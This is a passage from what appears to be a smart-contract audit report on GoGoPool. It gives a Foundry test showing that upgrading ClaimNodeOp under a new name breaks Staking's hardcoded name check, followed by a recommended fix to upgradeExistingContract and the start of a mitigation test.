class=\"mtk11\">fundGGPRewardsPool</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fundGGPRewardsPool</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// guardian is minted 100% of the supply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsPoolAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">TOTAL_INITIAL_GGP_SUPPLY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">.20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">), </span><span class=\"mtk12\">rewardsPoolAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">depositToken</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;RewardsPool&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rewardsPoolAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testUpgradeExistingContractWithNameChanged</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">//@audit increase GGPRewards before upgrading contract - succeed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">)) == </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit Start to upgrade contract ClaimNodeOp to ClaimNodeOpV2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit upgrad contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ClaimNodeOpV2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nopClaimV2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ClaimNodeOpV2</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaimV2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit contract name must be changed due to the limitation of `upgradeExistingContract` coding logic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;ClaimNodeOpV2&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit get existing contract ClaimNodeOp info</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit the existing contract should be already registered. Verify its info.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">//@audit Upgrade contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">upgradeExistingContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit verify that the upgraded contract has correct contract info registered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">name</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit verify that the old contract has been de-registered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">))), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">//@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaimV2</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit using the upgraded contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BaseAbstract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">InvalidOrOutdatedContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit revert due to contract Staking using hardcoded contract name &quot;ClaimNodeOp&quot; in the modifier</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Upgrading contract does not have to change contranct names especially in such a complicated system wherein contracts are cross-referenced in a hardcoded way. I would suggest not to change contract names when upgrading contracts.</li>\n<li>In function <code>upgradeExistingContract</code> definition, swap fucnction call sequence between <code>registerContract()</code> and <code>unregisterContract()</code> so that contract names can keep unchanged after upgrading. That is, the modified function would be:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: https:</span><span class=\"mtk3\">//github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param newAddr Address of the new contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param newName Name of the new contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param existingAddr Address of the existing contract to be deleted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">upgradeExistingContract</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newAddr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newName</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">//@audit this `newName` parameter can be removed if upgrading don&#39;t change contract name</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingAddr</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  \t\t</span><span class=\"mtk11\">unregisterContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit unregister the existing contract first</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">registerContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">newName</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit then register the upgraded contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p><strong>POC of Mitigation</strong>:</p>\n<p>After the above recommended mitigation, the below Testcase verifies that after upgrading contracts, other contract’s functions, which reference the hardcoded contract name, can still opetate correctly.</p>\n<ol>\n<li>Make the above recommended mitigation in function <code>ProtocolDAO.upgradeExistingContract</code>;</li>\n<li>Put the below test file <code>UpgradeContractImproved.t.sol</code> under folder <code>test/unit/</code>;</li>\n<li>Run the test.</li>\n</ol>\n<p><strong>Note</strong>: Since we don’t change the upgraded contract name, for testing purpose, we just need to create a new contract instance (so that the contract instance address is changed) to simulate the contract upgrading.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// File: UpgradeContractImproved.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// SPDX-License-Identifier: GPL-3.0-only</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">17</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./utils/BaseTest.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ClaimNodeOp</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/contract/ClaimNodeOp.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">BaseAbstract</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/contract/BaseAbstract.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">UpgradeContractImprovedTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BaseTest</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TOTAL_INITIAL_GGP_SUPPLY</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">22_500_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;nodeOp1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 